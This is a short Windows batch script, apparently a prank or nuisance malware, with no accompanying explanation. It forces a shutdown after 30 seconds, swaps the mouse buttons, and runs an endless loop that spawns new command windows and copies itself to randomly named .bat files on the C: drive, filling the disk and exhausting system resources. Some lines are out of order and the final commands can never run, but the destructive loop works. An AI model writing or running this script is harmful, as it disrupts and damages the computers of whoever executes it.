   color A
   shutdown -s -t 30 -c copying
   RUNDLL32 USER32.DLL,SwapMouseButton
   @echo off
   :loop
   start
   copy %0 c:\%random%.bat
   goto loop
   cls
   exit
